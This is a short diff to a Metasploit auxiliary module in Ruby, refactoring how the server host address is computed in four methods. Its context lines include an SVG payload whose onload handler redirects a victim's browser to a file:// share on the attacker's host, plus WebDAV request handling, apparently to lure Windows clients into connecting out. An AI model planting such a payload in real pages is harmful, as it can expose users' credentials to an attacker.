@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def js
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    my_host = (srvhost == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : srvhost
 
     %Q|function report() {
   if(window.location.protocol != 'file:') {
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def svg
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    my_host = (srvhost == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : srvhost
 
     %Q|<!-- saved from url=(0014)about:internet -->
 <svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    my_host = (srvhost == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : srvhost
 
     case request.method
     when 'OPTIONS'
@@ -206,7 +206,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("PROPFIND #{path}")
     body = ''
 
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+    my_host = (srvhost == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : srvhost
     my_uri = "http://#{my_host}/"
 
     if path !~ /\/$/
